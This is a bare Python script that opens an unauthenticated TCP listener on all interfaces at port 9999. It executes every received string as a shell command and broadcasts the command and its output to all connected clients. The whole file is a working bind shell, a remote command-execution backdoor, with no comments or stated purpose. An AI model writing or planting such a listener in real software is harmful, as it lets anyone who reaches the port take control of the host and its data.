import socket
import threading
import subprocess

clients = []

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break

            output = subprocess.getoutput(command)

            for client in clients:
                client.sendall(f'{command}\n{output}\n'.encode('utf-8'))
        except:
            break

    client_socket.close()
    clients.remove(client_socket)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Server listening on port 9999...')

    while True:
        client_socket, addr = server.accept()
        print(f'Accepted connection from {addr}')
        clients.append(client_socket)
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    start_server()
